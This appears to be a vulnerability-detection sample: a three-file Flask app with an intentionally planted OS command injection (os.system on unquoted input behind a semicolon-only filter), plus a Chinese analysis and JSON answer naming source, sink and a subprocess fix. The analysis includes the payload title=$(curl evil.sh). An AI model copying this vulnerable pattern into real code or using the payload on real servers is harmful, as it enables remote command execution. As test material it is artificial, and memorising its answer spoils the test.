@@ -1,0 +1,93 @@
+LANG: python
+```code
+# === file: app/routes.py ===
+from flask import Flask, request
+
+from app.services import GalleryService
+
+app = Flask(__name__)
+service = GalleryService()
+
+
+@app.route('/display', methods=['GET'])
+def display():
+    # 外部输入点：path 与 title 均来自查询串
+    path = request.args.get('path')
+    title = request.args.get('title')
+    ok = service.display(path, title)
+    return {'shown': bool(ok)}
+
+
+@app.route('/upload', methods=['POST'])
+def upload():
+    # 第二入口：上传文件名先暂存，display 缺省时复用
+    name = request.form.get('filename', '')
+    service.stage(name)
+    return {'staged': True}
+
+# === file: app/services.py ===
+from app import viewers
+
+
+class GalleryService:
+    '''中间层：看似清洗输入，实则不完整'''
+
+    def __init__(self):
+        self.pending = ''
+
+    def stage(self, name):
+        self.pending = name
+
+    def display(self, path=None, title=None):
+        target = path or self.pending
+        if title:
+            # 弱防御：仅剔除分号，$() 反引号 && | 均可穿透
+            title = title.replace(';', '')
+        v = viewers.pick_viewer()
+        return v.show_image(target, title=title)
+
+# === file: app/viewers.py ===
+import os
+
+
+class Viewer:
+    def get_command(self, file, **options):
+        raise NotImplementedError
+
+    def show_image(self, image, **options):
+        return self.show_file(image, **options)
+
+    def show_file(self, path, **options):
+        if not os.path.exists(path):
+            raise FileNotFoundError
+        os.system(self.get_command(path, **options))  # sink: CWE-78
+        return 1
+
+
+class DisplayViewer(Viewer):
+    def get_command(self, file, title=None, **options):
+        command = 'display'
+        if title:
+            command += ' -title ' + title
+        return command + ' ' + file
+
+
+def pick_viewer():
+    return DisplayViewer()
+```
+
+**分析（覆盖固定清单）：**
+
+1. **外部输入点枚举与可达性**：共 3 个输入点——app/routes.py 第 12 行 `path`、第 13 行 `title`（GET /display）、第 21 行 `filename`（POST /upload）。主链 `title` 经第 14 行传入 service.display，直达 app/viewers.py 第 14 行 `os.system`；`path` 与暂存的 `filename` 在 app/services.py 第 14 行合并为 `target` 后同样抵达同一 sink，三条流全部可达。
+
+2. **防御逐条验证**：链上仅有两处处理。其一 app/services.py 第 17 行 `replace(';', '')` 为单字符黑名单删除，`$( )`、反引号、`&&`、`|`、换行均可穿透，属可绕过的无效防御；其二 app/viewers.py 第 12 行 `os.path.exists` 仅为存在性检查，不转义、不过滤元字符。sink 端第 22-23 行以裸字符串拼接 title 与 file 且未用 shlex.quote，最终第 14 行 `os.system` 交由 shell 解释，全链无参数化执行或白名单校验。
+
+3. **触发路径**：请求 `GET /display?path=x.png&title=$(curl evil.sh)` → 第 17 行弱过滤不影响该 payload → app/viewers.py 第 22 行拼出 `display -title $(curl evil.sh) x.png` → 第 14 行 os.system 执行注入段，实现任意命令执行（RCE）。
+
+4. **第二入口与替代通道**：存在第二入口 POST /upload（app/routes.py 第 18-23 行），任意 filename 经 app/services.py 第 10-11 行暂存后，在不带 path 的 GET /display 中于第 14 行被复用进入同一 sink；同时同一路由的 path 与 title 两参数互为替代通道，任一均可独立完成注入，多入口汇聚证实漏洞不可归因于单点误用。
+
+5. **结论**：source 位于 app/routes.py（文件 1），sink 位于 app/viewers.py（文件 3），二者跨文件分离；中间层 services.py 仅做看似清洗实则不完整的传递，调用链上无完整防御，判定为可远程利用的 CWE-78，风险等级 Critical。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-78 操作系统命令注入", "risk_level": "Critical", "source": "L1:line 13: request.args.get('title') —— HTTP 查询参数 title", "sink": "L3:line 14: os.system(self.get_command(path, **options))", "explanation": "数据流A(主链)：L1:line13 title 由查询串读入 → L1:line14 service.display → L2:line17 仅 replace(';','') 的黑名单式弱过滤，$() 反引号 && | 换行均可穿透 → L2:line19 show_image → L3:line9 show_file → L3:line22 将未净化 title 裸拼进 shell 字符串 → L3:line14 os.system 执行，payload 如 title=$(id) 即可 RCE；数据流B(路径通道)：L1:line12 path → L2:line14 target → 同一 sink，全程无净化，L3:line12 的 os.path.exists 只是存在性检查而非防御；防御核查：链上唯一处理是 L2:line17 单字符黑名单删除与 L3:line12 存在性检查，前者可绕过后者不改写命令语义，且 L3:line22-23 未使用 shlex.quote，无任何有效防御；第二入口：L1:line21 POST /upload 的 filename 经 L2:line11 stage 暂存，当 /display 缺省 path 时于 L2:line14 复用进入同一 sink，构成替代通道；另同路由 path 与 title 双参数互为替代通道均可独立触达 sink，多入口汇聚支撑 has_vulnerability=true", "fix_suggestion": "line 14: 以 subprocess.run(['display','-title',title,file], shell=False) 的参数列表形式替换 os.system，杜绝 shell 元字符解析"}
+```
